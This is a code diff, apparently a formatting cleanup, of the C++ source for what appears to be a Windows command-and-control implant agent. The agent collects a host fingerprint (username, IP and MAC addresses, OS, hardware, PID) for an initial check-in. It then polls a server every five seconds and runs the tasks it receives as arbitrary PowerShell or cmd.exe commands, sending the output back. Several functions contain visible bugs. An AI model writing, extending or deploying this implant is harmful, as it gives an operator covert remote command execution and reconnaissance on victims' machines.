@@ -3,8 +3,11 @@
 #define _WIN32_WINNT 0x0600
 
 #include "Agent.h"
+
 #include <stdio.h>
 #ifdef _WIN32
+// Order matters for the Windows API: winsock2 must come before windows,
+// and iphlpapi requires windows. Do not let clang-format re-sort this block.
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <iphlpapi.h>
@@ -12,11 +15,11 @@
 #include <psapi.h>
 #endif
 
-#include <iostream>
-#include <memory>
 #include <array>
 #include <cmath>
 #include <cstdio>
+#include <iostream>
+#include <memory>
 
 #pragma comment(lib, "psapi.lib")
 #pragma comment(lib, "iphlpapi.lib")
@@ -24,407 +27,349 @@
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
 // Default constructor
-Agent::Agent(CommManager commManager, TaskQueueManager taskManager)
-{
-	commManager = commManager;
-	taskManager = taskManager;
+Agent::Agent(CommManager commManager, TaskQueueManager taskManager) {
+    commManager = commManager;
+    taskManager = taskManager;
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
-void Agent::Start()
-{
-	commManager.IntialCheckin(GetHostInformation().StructToJson());
+void Agent::Start() {
+    commManager.IntialCheckin(GetHostInformation().StructToJson());
 
-	while (true)
-	{
-		if (!taskManager.HasPendingResult())
-		{
-			taskManager.QueueTask(commManager.Checkin());
-		}
-		else
-		{
-			std::string newTask = commManager.Checkin(taskManager.GetTaskResult());
-			taskManager.QueueTask(newTask);
-		}
+    while (true) {
+        if (!taskManager.HasPendingResult()) {
+            taskManager.QueueTask(commManager.Checkin());
+        } else {
+            std::string newTask = commManager.Checkin(taskManager.GetTaskResult());
+            taskManager.QueueTask(newTask);
+        }
 
-		if (taskManager.HasPendingTask())
-		{
-			CheckinResponse task = taskManager.GetNextTask();
-			std::string result;
-			switch (task.type)
-			{
-			case 1:
-				result = ExecutePowerShell(task.powerShellCommand.commandlet);
-				taskManager.StoreTaskResult(task.id, true, result);
-				break;
-			}
-		}
-		Sleep(5000);
-	}
+        if (taskManager.HasPendingTask()) {
+            CheckinResponse task = taskManager.GetNextTask();
+            std::string result;
+            switch (task.type) {
+                case 1:
+                    result = ExecutePowerShell(task.powerShellCommand.commandlet);
+                    taskManager.StoreTaskResult(task.id, true, result);
+                    break;
+            }
+        }
+        Sleep(5000);
+    }
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
 // Agent default commands
 
-void Agent::Exit()
-{
-	ExitProcess(0);
+void Agent::Exit() { ExitProcess(0); }
+
+std::string Agent::GetUID() {
+    char username[256];
+    DWORD username_len = sizeof(username);
+    // Get the username of the current user
+    if (GetUserNameA(username, &username_len)) {
+        return std::string(username);
+    }
+
+    return std::string();
 }
 
-std::string Agent::GetUID()
-{
-	char username[256];
-	DWORD username_len = sizeof(username);
-	// Get the username of the current user
-	if (GetUserNameA(username, &username_len))
-	{
-		return std::string(username);
-	}
-
-	return std::string();
-}
-
-std::string Agent::ExecutePowerShell(const std::string& command)
-{
+std::string Agent::ExecutePowerShell(const std::string& command) {
 #ifdef _WIN32
-	// Execute PowerShell command and return the output
-	std::string result;
-	std::string psCommand = "powershell.exe -Command \"" + command + "\"";
-	FILE* pipe = _popen(psCommand.c_str(), "r");
-	if (!pipe)
-	{
-		return "Error executing PowerShell command.";
-	}
+    // Execute PowerShell command and return the output
+    std::string result;
+    std::string psCommand = "powershell.exe -Command \"" + command + "\"";
+    FILE* pipe = _popen(psCommand.c_str(), "r");
+    if (!pipe) {
+        return "Error executing PowerShell command.";
+    }
 
-	char buffer[128];
-	while (fgets(buffer, sizeof(buffer), pipe) != nullptr)
+    char buffer[128];
+    while (fgets(buffer, sizeof(buffer), pipe) != nullptr)
 
-	{
-		result += buffer;
-	}
+    {
+        result += buffer;
+    }
 
-	_pclose(pipe);
+    _pclose(pipe);
 
-	return result;
+    return result;
 #else
-	(void)command; // Suppress unused parameter warning
-	return "PowerShell execution is only supported on Windows.";
+    (void)command;  // Suppress unused parameter warning
+    return "PowerShell execution is only supported on Windows.";
 #endif
 }
 
-std::string Agent::ExecuteShell(const std::string& command)
-{
+std::string Agent::ExecuteShell(const std::string& command) {
 #ifdef _WIN32
-	std::string result;
-	std::string shellCommand = "cmd.exe /C " + command;
+    std::string result;
+    std::string shellCommand = "cmd.exe /C " + command;
 
-	FILE* pipe = _popen(shellCommand.c_str(), "r");
-	if (!pipe)
-	{
-		return "Error executing shell command.";
-	}
+    FILE* pipe = _popen(shellCommand.c_str(), "r");
+    if (!pipe) {
+        return "Error executing shell command.";
+    }
 
-	char buffer[128];
-	while (fgets(buffer, sizeof(buffer), pipe) != nullptr)
-	{
-		result += buffer;
-	}
+    char buffer[128];
+    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
+        result += buffer;
+    }
 
-	_pclose(pipe);
+    _pclose(pipe);
 
-	return result;
+    return result;
 #else
-	(void)command;
-	return "Shell execution is only supported on windows.";
+    (void)command;
+    return "Shell execution is only supported on windows.";
 #endif
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
 // Helpers
-std::string ConvertLPWSTRToStdString(LPWSTR lpwstr)
-{
-	if (!lpwstr)
-		return "";
-	int size = WideCharToMultiByte(CP_UTF8, 0, lpwstr, -1, NULL, 0, NULL, NULL);
+std::string ConvertLPWSTRToStdString(LPWSTR lpwstr) {
+    if (!lpwstr) return "";
+    int size = WideCharToMultiByte(CP_UTF8, 0, lpwstr, -1, NULL, 0, NULL, NULL);
 
-	if (size <= 0)
-		return "";
-	std::string result(size - 1, 0);
-	WideCharToMultiByte(CP_UTF8, 0, lpwstr, -1, &result[0], size, NULL, NULL);
+    if (size <= 0) return "";
+    std::string result(size - 1, 0);
+    WideCharToMultiByte(CP_UTF8, 0, lpwstr, -1, &result[0], size, NULL, NULL);
 
-	return result;
+    return result;
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
-std::string Agent::CaptureCommandOutput(const std::string& cmd)
-{
-	std::array<char, 128> buffer;
-	std::string result;
+std::string Agent::CaptureCommandOutput(const std::string& cmd) {
+    std::array<char, 128> buffer;
+    std::string result;
 
-	std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd.c_str(), "r"), _pclose);
+    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd.c_str(), "r"), _pclose);
 
-	while (fgets(buffer.data(), buffer.size(), pipe.get()) != NULL)
-	{
-		result += buffer.data();
-	}
+    while (fgets(buffer.data(), buffer.size(), pipe.get()) != NULL) {
+        result += buffer.data();
+    }
 
-	if (!result.empty())
-	{
-		result.erase(result.find_last_not_of(" \n\r\t") + 1);
-	}
-	return result;
+    if (!result.empty()) {
+        result.erase(result.find_last_not_of(" \n\r\t") + 1);
+    }
+    return result;
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
 // Host metadata commands
-std::string Agent::GetMotherBoard()
-{
-	std::string cmd = "powershell -Command \"(Get-CimInstance Win32_BaseBoard).Product\"";
-	std::string name = CaptureCommandOutput(cmd);
-	return name;
+std::string Agent::GetMotherBoard() {
+    std::string cmd = "powershell -Command \"(Get-CimInstance Win32_BaseBoard).Product\"";
+    std::string name = CaptureCommandOutput(cmd);
+    return name;
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
-BOOL Agent::GetUsername(OUT LPWSTR* szWhoamiStr)
-{
-	DWORD dwSize = 0x00;
-	BOOL bResult = FALSE;
+BOOL Agent::GetUsername(OUT LPWSTR* szWhoamiStr) {
+    DWORD dwSize = 0x00;
+    BOOL bResult = FALSE;
 
-	if (!GetUserNameW(NULL, &dwSize) && GetLastError() != ERROR_INSUFFICIENT_BUFFER)
-	{
-		std::cout << "[x] GetUserNameW [%d] Failed With Error: %d \n", __LINE__, GetLastError();
-		goto _END_OF_FUNC;
-	}
+    if (!GetUserNameW(NULL, &dwSize) && GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
+        std::cout << "[x] GetUserNameW [%d] Failed With Error: %d \n", __LINE__, GetLastError();
+        goto _END_OF_FUNC;
+    }
 
-	if (!(*szWhoamiStr = (LPWSTR)LocalAlloc(LPTR, dwSize * sizeof(WCHAR))))
-	{
-		std::cout << "[x] LocalAlloc Failed With Error: %d \n", GetLastError();
-		goto _END_OF_FUNC;
-	}
+    if (!(*szWhoamiStr = (LPWSTR)LocalAlloc(LPTR, dwSize * sizeof(WCHAR)))) {
+        std::cout << "[x] LocalAlloc Failed With Error: %d \n", GetLastError();
+        goto _END_OF_FUNC;
+    }
 
-	if (!GetUserNameW(*szWhoamiStr, &dwSize))
-	{
-		std::cout << "[x] GetUserNameW Failed With Error: %d \n", __LINE__, GetLastError();
-		goto _END_OF_FUNC;
-	}
+    if (!GetUserNameW(*szWhoamiStr, &dwSize)) {
+        std::cout << "[x] GetUserNameW Failed With Error: %d \n", __LINE__, GetLastError();
+        goto _END_OF_FUNC;
+    }
 
-	bResult = TRUE;
+    bResult = TRUE;
 
 _END_OF_FUNC:
-	if (!bResult && *szWhoamiStr)
-	{
-		LocalFree(*szWhoamiStr);
-	}
-	return bResult;
+    if (!bResult && *szWhoamiStr) {
+        LocalFree(*szWhoamiStr);
+    }
+    return bResult;
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
-std::string Agent::GetInternalIP()
-{
-	ULONG outBufLen = 15000;
-	std::vector<BYTE> buffer(outBufLen);
-	PIP_ADAPTER_ADDRESSES pAddresses = reinterpret_cast<PIP_ADAPTER_ADDRESSES>(buffer.data());
+std::string Agent::GetInternalIP() {
+    ULONG outBufLen = 15000;
+    std::vector<BYTE> buffer(outBufLen);
+    PIP_ADAPTER_ADDRESSES pAddresses = reinterpret_cast<PIP_ADAPTER_ADDRESSES>(buffer.data());
 
-	// Retrieve network adapter configurations
-	DWORD dwRetVal = GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_PREFIX, NULL, pAddresses, &outBufLen);
+    // Retrieve network adapter configurations
+    DWORD dwRetVal = GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_PREFIX, NULL, pAddresses, &outBufLen);
 
-	if (dwRetVal == ERROR_BUFFER_OVERFLOW)
-	{
-		buffer.resize(outBufLen);
-		pAddresses = reinterpret_cast<PIP_ADAPTER_ADDRESSES>(buffer.data());
-		dwRetVal = GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_PREFIX, NULL, pAddresses, &outBufLen);
-	}
+    if (dwRetVal == ERROR_BUFFER_OVERFLOW) {
+        buffer.resize(outBufLen);
+        pAddresses = reinterpret_cast<PIP_ADAPTER_ADDRESSES>(buffer.data());
+        dwRetVal = GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_PREFIX, NULL, pAddresses, &outBufLen);
+    }
 
-	if (dwRetVal == NO_ERROR)
-	{
-		while (pAddresses)
-		{
-			// Ignore loopback and inactive interfaces
-			if (pAddresses->IfType != IF_TYPE_SOFTWARE_LOOPBACK && pAddresses->OperStatus == IfOperStatusUp)
-			{
-				PIP_ADAPTER_UNICAST_ADDRESS pUnicast = pAddresses->FirstUnicastAddress;
-				while (pUnicast)
-				{
-					if (pUnicast->Address.lpSockaddr->sa_family == AF_INET)
-					{
-						sockaddr_in* sa_in = reinterpret_cast<sockaddr_in*>(pUnicast->Address.lpSockaddr);
+    if (dwRetVal == NO_ERROR) {
+        while (pAddresses) {
+            // Ignore loopback and inactive interfaces
+            if (pAddresses->IfType != IF_TYPE_SOFTWARE_LOOPBACK && pAddresses->OperStatus == IfOperStatusUp) {
+                PIP_ADAPTER_UNICAST_ADDRESS pUnicast = pAddresses->FirstUnicastAddress;
+                while (pUnicast) {
+                    if (pUnicast->Address.lpSockaddr->sa_family == AF_INET) {
+                        sockaddr_in* sa_in = reinterpret_cast<sockaddr_in*>(pUnicast->Address.lpSockaddr);
 
-						int b1 = sa_in->sin_addr.S_un.S_un_b.s_b1;
-						int b2 = sa_in->sin_addr.S_un.S_un_b.s_b2;
-						int b3 = sa_in->sin_addr.S_un.S_un_b.s_b3;
-						int b4 = sa_in->sin_addr.S_un.S_un_b.s_b4;
+                        int b1 = sa_in->sin_addr.S_un.S_un_b.s_b1;
+                        int b2 = sa_in->sin_addr.S_un.S_un_b.s_b2;
+                        int b3 = sa_in->sin_addr.S_un.S_un_b.s_b3;
+                        int b4 = sa_in->sin_addr.S_un.S_un_b.s_b4;
 
-						char ipBuffer[16];
-						sprintf_s(ipBuffer, "%d.%d.%d.%d", b1, b2, b3, b4);
-						return std::string(ipBuffer);
-					}
-					pUnicast = pUnicast->Next;
-				}
-			}
-			pAddresses = pAddresses->Next;
-		}
-	}
+                        char ipBuffer[16];
+                        sprintf_s(ipBuffer, "%d.%d.%d.%d", b1, b2, b3, b4);
+                        return std::string(ipBuffer);
+                    }
+                    pUnicast = pUnicast->Next;
+                }
+            }
+            pAddresses = pAddresses->Next;
+        }
+    }
 
-	return "idk";
+    return "idk";
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
-std::string Agent::GetExternalViaDNS()
-{
-	WSADATA wsaData;
-	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
-		return "";
+std::string Agent::GetExternalViaDNS() {
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return "";
 
-	struct addrinfo hints, * result = NULL;
-	ZeroMemory(&hints, sizeof(hints));
-	hints.ai_family = AF_INET;
-	hints.ai_socktype = SOCK_STREAM;
+    struct addrinfo hints, *result = NULL;
+    ZeroMemory(&hints, sizeof(hints));
+    hints.ai_family = AF_INET;
+    hints.ai_socktype = SOCK_STREAM;
 
-	DWORD dwRetval = getaddrinfo("www.google.com", NULL, &hints, &result);
-	if (dwRetval == 0)
-	{
-		struct sockaddr_in* sockaddr_ipv4 = (struct sockaddr_in*)result->ai_addr;
-		char ipStr[INET_ADDRSTRLEN];
-		inet_ntop(AF_INET, &(sockaddr_ipv4->sin_addr), ipStr, INET_ADDRSTRLEN);
-		return ipStr;
-		freeaddrinfo(result);
-	}
-	else
-	{
-		std::cerr << "DNS Query Failed." << std::endl;
-	}
-	WSACleanup();
-	return "";
+    DWORD dwRetval = getaddrinfo("www.google.com", NULL, &hints, &result);
+    if (dwRetval == 0) {
+        struct sockaddr_in* sockaddr_ipv4 = (struct sockaddr_in*)result->ai_addr;
+        char ipStr[INET_ADDRSTRLEN];
+        inet_ntop(AF_INET, &(sockaddr_ipv4->sin_addr), ipStr, INET_ADDRSTRLEN);
+        return ipStr;
+        freeaddrinfo(result);
+    } else {
+        std::cerr << "DNS Query Failed." << std::endl;
+    }
+    WSACleanup();
+    return "";
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
-std::string Agent::GetMachineMacAddress()
-{
-	ULONG bufferSize = 15000;
-	std::vector<BYTE> buffer(bufferSize);
+std::string Agent::GetMachineMacAddress() {
+    ULONG bufferSize = 15000;
+    std::vector<BYTE> buffer(bufferSize);
 
-	ULONG flags = GAA_FLAG_SKIP_DNS_SERVER | GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_MULTICAST;
-	PIP_ADAPTER_ADDRESSES adapterList = reinterpret_cast<PIP_ADAPTER_ADDRESSES>(buffer.data());
+    ULONG flags = GAA_FLAG_SKIP_DNS_SERVER | GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_MULTICAST;
+    PIP_ADAPTER_ADDRESSES adapterList = reinterpret_cast<PIP_ADAPTER_ADDRESSES>(buffer.data());
 
-	ULONG result = GetAdaptersAddresses(AF_UNSPEC, flags, NULL, adapterList, &bufferSize);
+    ULONG result = GetAdaptersAddresses(AF_UNSPEC, flags, NULL, adapterList, &bufferSize);
 
-	if (result == ERROR_BUFFER_OVERFLOW)
-	{
-		buffer.resize(bufferSize);
-		adapterList = reinterpret_cast<PIP_ADAPTER_ADDRESSES>(buffer.data());
-		result = GetAdaptersAddresses(AF_UNSPEC, flags, NULL, adapterList, &bufferSize);
-	}
+    if (result == ERROR_BUFFER_OVERFLOW) {
+        buffer.resize(bufferSize);
+        adapterList = reinterpret_cast<PIP_ADAPTER_ADDRESSES>(buffer.data());
+        result = GetAdaptersAddresses(AF_UNSPEC, flags, NULL, adapterList, &bufferSize);
+    }
 
-	if (result == NO_ERROR)
-	{
-		for (PIP_ADAPTER_ADDRESSES adapter = adapterList; adapter != NULL; adapter = adapter->Next)
-		{
-			if (adapter->OperStatus == IfOperStatusUp && adapter->PhysicalAddressLength == 6)
-			{
-				char macBuffer[18];
-				snprintf(macBuffer, sizeof(macBuffer), "%02X:%02X:%02X:%02X:%02X:%02X",
-					adapter->PhysicalAddress[0], adapter->PhysicalAddress[1],
-					adapter->PhysicalAddress[2], adapter->PhysicalAddress[3],
-					adapter->PhysicalAddress[4], adapter->PhysicalAddress[5]);
+    if (result == NO_ERROR) {
+        for (PIP_ADAPTER_ADDRESSES adapter = adapterList; adapter != NULL; adapter = adapter->Next) {
+            if (adapter->OperStatus == IfOperStatusUp && adapter->PhysicalAddressLength == 6) {
+                char macBuffer[18];
+                snprintf(macBuffer, sizeof(macBuffer), "%02X:%02X:%02X:%02X:%02X:%02X", adapter->PhysicalAddress[0],
+                         adapter->PhysicalAddress[1], adapter->PhysicalAddress[2], adapter->PhysicalAddress[3],
+                         adapter->PhysicalAddress[4], adapter->PhysicalAddress[5]);
 
-				return std::string(macBuffer);
-			}
-		}
-	}
+                return std::string(macBuffer);
+            }
+        }
+    }
 
-	return "";
+    return "";
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
-std::string Agent::GetProcessName()
-{
-	HANDLE hProcess = GetCurrentProcess();
-	char buffer[MAX_PATH];
+std::string Agent::GetProcessName() {
+    HANDLE hProcess = GetCurrentProcess();
+    char buffer[MAX_PATH];
 
-	DWORD size = GetModuleBaseNameA(hProcess, NULL, buffer, MAX_PATH);
-	return std::string(buffer, size);
+    DWORD size = GetModuleBaseNameA(hProcess, NULL, buffer, MAX_PATH);
+    return std::string(buffer, size);
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
-int Agent::GetPID()
-{
-	HANDLE hProcess = GetCurrentProcess();
-	return GetProcessId(hProcess);
+int Agent::GetPID() {
+    HANDLE hProcess = GetCurrentProcess();
+    return GetProcessId(hProcess);
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
-int Agent::GetOSVersion()
-{
-	PBYTE pSharedUserData = (PBYTE)0X7FFE0000;
-	return *(ULONG*)(pSharedUserData + 0x26C);
+int Agent::GetOSVersion() {
+    PBYTE pSharedUserData = (PBYTE)0X7FFE0000;
+    return *(ULONG*)(pSharedUserData + 0x26C);
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
-int Agent::GetRAM()
-{
-	MEMORYSTATUSEX memInfo;
-	memInfo.dwLength = sizeof(MEMORYSTATUSEX);
+int Agent::GetRAM() {
+    MEMORYSTATUSEX memInfo;
+    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
 
-	if (GlobalMemoryStatusEx(&memInfo))
-	{
-		double totalRamBytes = static_cast<double>(memInfo.ullTotalPhys);
-		double totalRamGB = totalRamBytes / (1024.0 * 1024.0 * 1024.0);
-		return static_cast<int>(std::round(totalRamGB));
-	}
+    if (GlobalMemoryStatusEx(&memInfo)) {
+        double totalRamBytes = static_cast<double>(memInfo.ullTotalPhys);
+        double totalRamGB = totalRamBytes / (1024.0 * 1024.0 * 1024.0);
+        return static_cast<int>(std::round(totalRamGB));
+    }
 
-	return 0;
+    return 0;
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
-void Agent::GetTotalDiskSize(OUT double* total, OUT double* free)
-{
-	ULARGE_INTEGER freeBytesAvailableToCaller;
-	ULARGE_INTEGER totalNumberOfBytes;
-	ULARGE_INTEGER totalNumberOfFreeBytes;
+void Agent::GetTotalDiskSize(OUT double* total, OUT double* free) {
+    ULARGE_INTEGER freeBytesAvailableToCaller;
+    ULARGE_INTEGER totalNumberOfBytes;
+    ULARGE_INTEGER totalNumberOfFreeBytes;
 
-	std::string cDrive = "C:\\";
+    std::string cDrive = "C:\\";
 
-	if (GetDiskFreeSpaceEx(cDrive.c_str(), &freeBytesAvailableToCaller, &totalNumberOfBytes, &totalNumberOfFreeBytes))
-	{
-		*total = std::round(static_cast<double>(totalNumberOfBytes.QuadPart) / (1024.0 * 1024.0 * 1024.0));
-		*free = std::round(static_cast<double>(totalNumberOfFreeBytes.QuadPart) / (1024.0 * 1024.0 * 1024.0));
-	}
+    if (GetDiskFreeSpaceEx(cDrive.c_str(), &freeBytesAvailableToCaller, &totalNumberOfBytes, &totalNumberOfFreeBytes)) {
+        *total = std::round(static_cast<double>(totalNumberOfBytes.QuadPart) / (1024.0 * 1024.0 * 1024.0));
+        *free = std::round(static_cast<double>(totalNumberOfFreeBytes.QuadPart) / (1024.0 * 1024.0 * 1024.0));
+    }
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
-int Agent::GetCpuCount()
-{
-	SYSTEM_INFO sysInfo;
-	GetSystemInfo(&sysInfo);
-	return static_cast<int>(sysInfo.dwNumberOfProcessors);
+int Agent::GetCpuCount() {
+    SYSTEM_INFO sysInfo;
+    GetSystemInfo(&sysInfo);
+    return static_cast<int>(sysInfo.dwNumberOfProcessors);
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
-IntitalCheckinRequest Agent::GetHostInformation()
-{
-	std::string internalIP;
-	std::string externalIP;
-	std::string OS;
-	double free, total;
-	LPWSTR username;
-	std::string processName;
-	int pid;
+IntitalCheckinRequest Agent::GetHostInformation() {
+    std::string internalIP;
+    std::string externalIP;
+    std::string OS;
+    double free, total;
+    LPWSTR username;
+    std::string processName;
+    int pid;
 
-	GetUsername(&username);
-	GetTotalDiskSize(&total, &free);
+    GetUsername(&username);
+    GetTotalDiskSize(&total, &free);
 
-	return IntitalCheckinRequest{
-		GetInternalIP(),
-		GetExternalViaDNS(),
-		"Windows " + std::to_string(GetOSVersion()),
-		ConvertLPWSTRToStdString(username),
-		GetProcessName(),
-		GetPID(),
-		"High", // TODO Integrity
-		GetMachineMacAddress(),
-		GetMotherBoard(),
-		GetRAM(),
-		total,
-		free,
-		GetCpuCount() };
+    return IntitalCheckinRequest{GetInternalIP(),
+                                 GetExternalViaDNS(),
+                                 "Windows " + std::to_string(GetOSVersion()),
+                                 ConvertLPWSTRToStdString(username),
+                                 GetProcessName(),
+                                 GetPID(),
+                                 "High",  // TODO Integrity
+                                 GetMachineMacAddress(),
+                                 GetMotherBoard(),
+                                 GetRAM(),
+                                 total,
+                                 free,
+                                 GetCpuCount()};
 }
